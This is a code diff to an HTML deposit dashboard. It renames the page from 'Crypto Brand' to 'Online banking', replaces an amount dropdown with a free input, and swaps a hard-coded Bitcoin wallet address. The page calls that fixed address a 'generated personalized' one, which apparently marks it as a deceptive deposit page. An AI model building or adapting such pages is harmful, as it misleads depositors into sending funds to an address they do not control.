@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard - Crypto Brand</title>
+    <title>Dashboard - Online banking</title>
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Chart.js Library -->
@@ -132,32 +132,25 @@
             <p id="nameError" class="text-red-500 text-sm hidden">Name is required.</p>
         </div>
 
-        <!-- Select Amount -->
-        <div class="mb-4 w-full">
-            <label class="block text-black" for="amount">Select Amount:</label>
-            <select id="amount" class="border rounded w-full p-2 focus:outline-none focus:ring-2 focus:ring-blue-400">
-                <option value="" disabled selected>Select an amount</option>
-                <option value="$100">$100</option>
-                <option value="$200">$200</option>
-                <option value="$500">$500</option>
-                <option value="$1000">$1000</option>
-                <option value="$2000">$2000</option>
-                <option value="$3000">$3000</option>
-                <option value="$5000">$5000</option>
-                <option value="$10000">$10000</option>
-                <option value="$20000">$20000</option>
-                <option value="$25000">$25000</option>
-                <option value="$50000">$50000</option>
-                <option value="$100000">$100000</option>
-            </select>
-            <p id="amountError" class="text-red-500 text-sm hidden">Amount is required.</p>
-        </div>
+<!-- Enter Amount -->
+<div class="mb-4 w-full">
+    <label class="block text-black" for="amount">Enter Amount:</label>
+    <input
+        type="number"
+        id="amount"
+        class="border rounded w-full p-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
+        placeholder="Enter an amount"
+        min="0"
+    />
+    <p id="amountError" class="text-red-500 text-sm hidden">Amount is required.</p>
+</div>
+
 
         <!-- Wallet Address -->
         <div class="mb-4 w-full">
             <label class="block text-black">Wallet Address:</label>
             <div class="flex flex-col items-start border rounded p-2 bg-gray-50 shadow-sm">
-                <span id="mobileWalletAddress" class="w-full text-gray-800 font-mono text-xs mb-2">bc1qn9hyygq498lrtxdqnx9t2px5s7jpsn0nv0vsys</span>
+                <span id="mobileWalletAddress" class="w-full text-gray-800 font-mono text-xs mb-2">bc1qkkj0payl2w0lh937vj27y0zwqgzre38jm0rey4</span>
                 <button id="mobileCopyButton" class="flex items-center justify-center px-4 py-2 bg-blue-900 text-white border rounded-lg hover:bg-blue-900 transition focus:outline-none">Copy</button>
                 <p class="text-gray-600 text-xs mt-2">Make deposits using your generated personalized wallet address.</p>
             </div>
